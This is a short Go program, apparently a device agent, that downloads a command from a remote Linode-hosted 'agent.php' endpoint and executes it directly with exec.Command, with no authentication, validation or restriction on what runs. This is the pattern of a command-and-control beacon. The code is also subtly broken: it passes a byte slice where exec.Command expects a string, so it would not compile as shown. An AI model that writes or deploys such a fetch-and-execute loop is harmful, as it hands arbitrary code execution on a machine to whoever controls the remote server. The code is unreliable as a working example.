package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
)

func main() {
	
	res, err := http.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
	if err != nil {
		log.Fatal(err)
	}
	robots, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("script to run is : %s", robots)

	out, err := exec.Command(robots).Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("output is %s\n", out)

    //cmd := exec.Command("/bin/sh", mongoToCsvSH)

}